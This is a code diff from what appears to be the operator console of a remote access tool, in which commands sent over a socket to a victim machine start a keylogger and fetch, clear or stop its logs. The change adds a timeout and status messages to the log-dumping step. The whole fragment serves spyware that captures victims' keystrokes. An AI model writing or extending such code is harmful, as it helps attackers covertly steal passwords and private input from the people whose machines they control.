@@ -245,8 +245,14 @@ def shellc():
              print('starting keylogger')
              pass
           elif perintah == 'baca_log':
-             data = _target.recv(1024).decode()
-             print(data)
+             print("Dumping logs:")
+             try:
+                _target.settimeout(3)
+                data = _target.recv(1024).decode()
+                print(data)
+             except socket.timeout:
+                print("No dump received, continuing")
+                pass
           elif perintah == 'clear_log':
              pass  
           elif perintah == 'stop_log':
